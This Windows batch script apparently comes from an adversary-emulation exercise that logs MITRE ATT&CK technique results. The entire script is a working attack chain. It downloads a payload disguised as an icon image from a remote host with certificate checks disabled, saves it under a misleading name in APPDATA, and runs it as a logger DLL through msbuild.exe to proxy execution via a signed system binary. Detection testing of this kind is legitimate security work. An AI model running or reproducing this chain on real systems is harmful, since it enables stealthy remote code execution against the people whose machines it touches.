@echo off
SETLOCAL EnableDelayedExpansion

SET a1=%APPDATA%\11152\0af008b5
SET a2=7fd2c3cb.txt
SET a3=https://10.0.0.49/stage/2/icon.png?11152-7
SET a4=ITZEL-S2BO
SET a5=11152
SET a6=7
SET a7=%PUBLIC%\\macula-simulations.log

SET tsvar=!DATE!/!TIME!
echo [!tsvar!][DEBUG][!a4!][!a5!]: heartbeat_start>> "!a7!" 2>nul

curl -k -s -o "!a1!\!a2!" "!a3!"
SET hb_el=!errorlevel!
IF !hb_el! EQU 0 (
    set heart_result=OK
    set heart_error=
) ELSE (
    set heart_result=FAIL
    set heart_error=curl_exit_!hb_el!
)
echo [!tsvar!][DEBUG][!a4!][!a5!]: heartbeat_complete=!heart_result!>> "!a7!" 2>nul
echo [!tsvar!][DEBUG][!a4!][!a5!]: heartbeat_result=!hb_el!>> "!a7!" 2>nul

IF !hb_el! NEQ 0 (
    echo [!tsvar!][DEBUG][!a4!][!a5!]: heartbeat_abort=no_dll>> "!a7!" 2>nul
    goto :done
)

SET dll_size=0
FOR %%I IN ("!a1!\!a2!") DO SET dll_size=%%~zI
IF !dll_size! LSS 1024 (
    echo [!tsvar!][DEBUG][!a4!][!a5!]: dll_size_fail=!dll_size!>> "!a7!" 2>nul
    goto :done
)
echo [!tsvar!][DEBUG][!a4!][!a5!]: dll_size_ok=!dll_size!>> "!a7!" 2>nul

echo [!tsvar!][DEBUG][!a4!][!a5!]: chdir_start>> "!a7!" 2>nul
cd /d "!a1!"
SET cd_el=!errorlevel!
echo [!tsvar!][DEBUG][!a4!][!a5!]: chdir_result=!cd_el!>> "!a7!" 2>nul

echo ^<Project/^> > "!a1!\build.proj"
SET proj_el=!errorlevel!
IF !proj_el! EQU 0 (
    set proj_result=OK
) ELSE (
    set proj_result=FAIL
)
echo [!tsvar!][DEBUG][!a4!][!a5!]: proj_create=!proj_result!>> "!a7!" 2>nul

echo [!tsvar!][DEBUG][!a4!][!a5!]: msbuild_start>> "!a7!" 2>nul
SET msbuild_out=!a1!\msbuild_dbg.txt
%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe "!a1!\build.proj" /logger:"!a1!\!a2!;MyParameters,Foo" > "!msbuild_out!" 2>&1
SET msbuild_el=!errorlevel!
IF !msbuild_el! EQU 0 (
    set msbuild_result=OK
) ELSE (
    set msbuild_result=FAIL
)
echo [!tsvar!][DEBUG][!a4!][!a5!]: msbuild_result=!msbuild_el!>> "!a7!" 2>nul
type "!msbuild_out!" >> "!a7!" 2>nul

IF "!heart_result!!proj_result!!msbuild_result!"=="OKOKOK" (
    set overall=OK
    set overall_error=
) ELSE (
    set overall=FAIL
    set overall_error=heart=!heart_result!;proj=!proj_result!;msbuild=!msbuild_result!
)

echo [!tsvar!][TTP][!a4!][!a5!]: T1218^|System Binary Proxy Execution=!overall!:!overall_error!>> "!a7!" 2>nul
echo [!tsvar!][TTP][!a4!][!a5!]: T1027^|Obfuscated Files or Information=!overall!:!overall_error!>> "!a7!" 2>nul

:done
ENDLOCAL
exit /b 0
